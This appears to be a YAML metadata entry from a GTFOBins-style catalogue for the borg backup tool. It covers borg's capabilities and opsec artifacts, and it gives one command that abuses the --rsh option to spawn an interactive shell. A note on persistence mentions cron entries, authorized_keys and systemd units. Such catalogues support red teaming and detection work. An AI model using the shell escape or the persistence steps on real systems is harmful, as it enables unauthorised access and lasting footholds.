---
name: borg
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'borg extract @:/::: --rsh "/bin/sh -c ''/bin/sh </dev/tty >/dev/tty 2>/dev/tty''"'
references:
- https://gtfobins.github.io/gtfobins/borg/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
